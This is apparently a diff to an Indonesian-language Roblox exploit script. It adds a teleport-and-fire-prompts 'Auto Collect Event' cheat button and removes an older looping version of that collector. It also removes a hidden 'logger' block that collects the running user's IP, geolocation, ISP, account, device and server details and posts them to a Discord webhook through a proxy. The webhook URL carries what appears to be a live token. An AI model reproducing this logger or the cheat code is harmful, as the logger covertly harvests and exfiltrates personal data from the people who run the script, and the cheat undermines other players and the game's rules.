@@ -783,6 +783,54 @@ buatTombol("⚡ Auto Kunti Bogel (Aim & Ambil)", function()
     end)
 end)
 
+buatTombol("Auto Collect Event (Once)", function()
+    pcall(function()
+        local character = lp.Character or lp.CharacterAdded:Wait()
+        local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+        local patrolFolder = workspace:FindFirstChild("Patrol")
+
+        if not patrolFolder then
+            buatNotifikasi("Event", "Folder Patrol tidak ditemukan!", 2.5)
+            return
+        end
+
+        local count = 0
+        for _, descendant in ipairs(patrolFolder:GetDescendants()) do
+            if not character or not character:FindFirstChild("Humanoid") or character.Humanoid.Health <= 0 then
+                break
+            end
+
+            if descendant:IsA("ProximityPrompt") then
+                local parentPart = descendant.Parent
+                local targetCFrame = nil
+
+                if parentPart:IsA("BasePart") then
+                    targetCFrame = parentPart.CFrame + Vector3.new(0, 3, 0)
+                elseif parentPart:IsA("Model") and parentPart.PrimaryPart then
+                    targetCFrame = parentPart.PrimaryPart.CFrame + Vector3.new(0, 3, 0)
+                end
+
+                if targetCFrame then
+                    humanoidRootPart.CFrame = targetCFrame
+                    task.wait(0.15) 
+                    
+                    if fireproximityprompt then
+                        fireproximityprompt(descendant)
+                    else
+                        descendant:InputHoldBegin()
+                        descendant:InputHoldEnd()
+                    end
+                    
+                    count = count + 1
+                    task.wait(0.1)
+                end
+            end
+        end
+
+        buatNotifikasi("Auto Collect", "Selesai! Berhasil mengumpulkan " .. count .. " event item.", 3)
+    end)
+end)
+
 buatTombol("Lobby / Area Telepon", function() teleportTo("Spawn") end)
 buatTombol("Ruang Listrik (Lantai 2)", function() teleportTo(CFrame.new(25.66, 17.65, -59.71)) end)
 buatTombol("Pintu Penyimpanan (Lantai 2)", function() teleportTo(CFrame.new(73.40, 17.78, -49.91)) end)
@@ -797,11 +845,6 @@ buatToggle("Auto Task Ruangan", false, function(v)
     if v then 
         task.spawn(buatNotifikasi, "Auto Task", "Auto Task Ruangan Diaktifkan!", 2) 
     end
-end)
-
-buatToggle("Auto Collect Event", true, function(v) 
-    autoPatrolTPActive = v 
-    if v then task.spawn(buatNotifikasi, "Event", "Auto Collect diaktifkan!", 2) end
 end)
 
 buatSection("Movement & Defensive Visuals")
@@ -907,72 +950,6 @@ task.spawn(function()
                 fireAllPrompts()
             end)
         end
-    end
-end)
-
--- Salin dan jalankan script ini di executor kamu (berjalan looping)
-
-local players = game:GetService("Players")
-local workspace = game:GetService("Workspace")
-
-local player = players.LocalPlayer
-
--- Menggunakan task.spawn agar loop berjalan di latar belakang tanpa nge-freeze game
-task.spawn(function()
-    while true do
-        local character = player.Character or player.CharacterAdded:Wait()
-        local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
-
-        local patrolFolder = workspace:FindFirstChild("Patrol")
-
-        if not patrolFolder then
-            warn("Folder 'Patrol' tidak ditemukan di dalam Workspace!")
-            task.wait(2) -- Coba lagi setelah 2 detik jika foldernya belum dimuat
-            continue
-        end
-
-        local count = 0
-
-        -- Jelajahi semua objek di dalam folder Patrol
-        for _, descendant in ipairs(patrolFolder:GetDescendants()) do
-            -- Cek apakah karakter masih hidup sebelum melanjutkan
-            if not character or not character:FindFirstChild("Humanoid") or character.Humanoid.Health <= 0 then
-                break
-            end
-
-            if descendant:IsA("ProximityPrompt") then
-                local parentPart = descendant.Parent
-                local targetCFrame = nil
-
-                if parentPart:IsA("BasePart") then
-                    targetCFrame = parentPart.CFrame + Vector3.new(0, 3, 0)
-                elseif parentPart:IsA("Model") and parentPart.PrimaryPart then
-                    targetCFrame = parentPart.PrimaryPart.CFrame + Vector3.new(0, 3, 0)
-                end
-
-                if targetCFrame then
-                    -- Teleport ke posisi prompt
-                    humanoidRootPart.CFrame = targetCFrame
-                    task.wait(0.15) -- Jeda agar posisi tersinkronisasi
-                    
-                    -- Trigger ProximityPrompt
-                    if fireproximityprompt then
-                        fireproximityprompt(descendant)
-                    else
-                        descendant:InputHoldBegin()
-                        descendant:InputHoldEnd()
-                    end
-                    
-                    count = count + 1
-                    task.wait(0.1)
-                end
-            end
-        end
-
-        print("Satu siklus selesai! Berhasil men-trigger " .. count .. " prompt. Mengulang kembali...")
-        
-        -- Jeda sebelum memulai loop berikutnya (bisa diubah sesuai kebutuhan)
-        task.wait(1)
     end
 end)
 
@@ -1387,139 +1364,5 @@ Players.PlayerRemoving:Connect(function(player)
         pcall(function()
             TeleportService:Teleport(game.PlaceId, LocalPlayer)
         end)
-    end
-end)
--- ==========================================
--- 3. FITUR LOGGER
--- ==========================================
--- Webhook konfigurasi (Menggunakan proxy agar tembus dari executor ke Discord)
-local originalWebhook = "https://discord.com/api/webhooks/1552831079268749383/xiF10HA8hLedfjIjeBYrhe90PVBDta_Us1wuWBI8Xrt8s2ijfls_WyU3lr6nrDQgsBrA"
-local proxyWebhook = originalWebhook:gsub("discord.com", "webhook.lewisakura.moe")
-
-local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
-local UserInputService = game:GetService("UserInputService")
-local localPlayer = Players.LocalPlayer
-
--- Fungsi HTTP universal executor
-local requestFunc = syn and syn.request or http and http.request or fluxus and fluxus.request or request
-if not requestFunc then return end
-
--- 1. Informasi Akun & Thumbnail Roblox
-local playerName = localPlayer.Name
-local displayName = localPlayer.DisplayName
-local userId = localPlayer.UserId
-local accountAge = localPlayer.AccountAge
-local membershipType = tostring(localPlayer.MembershipType):gsub("Enum.MembershipType.", "")
-
--- Ambil Avatar Headshot URL resmi dari Roblox
-local thumbUrl = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", userId)
-
--- 2. Pelacakan IP & Lokasi (GeoIP)
-local ipQuery, country, region, city, isp = "Unknown", "Unknown", "Unknown", "Unknown", "Unknown"
-pcall(function()
-    local res = requestFunc({Url = "http://ip-api.com/json/", Method = "GET"})
-    if res and res.StatusCode == 200 then
-        local data = HttpService:JSONDecode(res.Body)
-        if data.status == "success" then
-            ipQuery = data.query or "Unknown"
-            country = data.country or "Unknown"
-            region = data.regionName or "Unknown"
-            city = data.city or "Unknown"
-            isp = data.isp or "Unknown"
-        end
-    end
-end)
-
--- 3. Info Perangkat & Platform
-local platform = "PC / Desktop"
-if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
-    platform = "Mobile (Android/iOS)"
-elseif UserInputService.GamepadEnabled then
-    platform = "Console / Gamepad"
-end
-
--- Deteksi Executor yang Digunakan
-local executorName = identifyexecutor and identifyexecutor() or "Unknown Executor"
-
--- 4. Koordinat Posisi In-Game
-local coords = "Vector3(0, 0, 0)"
-pcall(function()
-    local char = localPlayer.Character or localPlayer.CharacterAdded:Wait()
-    local hrp = char:WaitForChild("HumanoidRootPart")
-    local p = hrp.Position
-    coords = string.format("X: %.1f | Y: %.1f | Z: %.1f", p.X, p.Y, p.Z)
-end)
-
--- 5. Detail Game & Server
-local successGame, gameName = pcall(function()
-    return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
-end)
-if not successGame then gameName = "Unknown Game" end
-
-local placeId = game.PlaceId
-local jobId = game.JobId
-
--- 6. Susunan Format Discord Embed yang Estetik
-data = {
-    ["content"] = "@everyone 🚨 **[ADVANCED LOGGER] Sesi Eksekusi Baru Terdeteksi!**",
-    ["embeds"] = {
-        {
-            ["title"] = "👑 " .. playerName .. " (" .. displayName .. ")",
-            ["url"] = "https://www.roblox.com/users/" .. userId .. "/profile",
-            ["color"] = 5814783, -- Warna aksen biru neon modern
-            ["thumbnail"] = {
-                ["url"] = thumbUrl
-            },
-            ["fields"] = {
-                {
-                    ["name"] = "👤 **Informasi Akun**",
-                    ["value"] = string.format("• **User ID:** `%d`\n• **Umur Akun:** `%d hari`\n• **Membership:** `%s`", userId, accountAge, membershipType),
-                    ["inline"] = false
-                },
-                {
-                    ["name"] = "📍 **Lokasi & Jaringan (GeoIP)**",
-                    ["value"] = string.format("• **IP:** `%s`\n• **Negara:** `%s`\n• **Wilayah:** `%s` (%s)\n• **ISP:** `%s`", ipQuery, country, city, region, isp),
-                    ["inline"] = false
-                },
-                {
-                    ["name"] = "💻 **Perangkat & Executor**",
-                    ["value"] = string.format("• **Platform:** `%s`\n• **Executor:** `%s`\n• **Posisi In-Game:** `%s`", platform, executorName, coords),
-                    ["inline"] = false
-                },
-                {
-                    ["name"] = "🎮 **Detail Permainan**",
-                    ["value"] = string.format("• **Game:** `%s`\n• **Place ID:** `%d`", gameName, placeId),
-                    ["inline"] = false
-                },
-                {
-                    ["name"] = "🔗 **Quick Join Command**",
-                    ["value"] = "```lua\ngame:GetService('TeleportService'):TeleportToPlaceInstance(" .. placeId .. ", '" .. jobId .. "', game:GetService('Players').LocalPlayer)\n```",
-                    ["inline"] = false
-                }
-            },
-            ["footer"] = {
-                ["text"] = "⚡ Secure Luau Logger System • " .. os.date("%d/%m/%Y - %X"),
-                ["icon_url"] = "https://cdn.jsdelivr.net/gh/twitter/twemoji@14.0.2/assets/72x72/1f512.png"
-            }
-        }
-    }
-}
-
-local jsonMessage = HttpService:JSONEncode(data)
-
--- Kirim data ke Discord secara asinkronus
-task.spawn(function()
-    local success, err = pcall(function()
-        return requestFunc({
-            Url = proxyWebhook,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = jsonMessage
-        })
-    end)
-    
-    if not success then
-        warn("Gagal mengirim log: " .. tostring(err))
     end
 end)
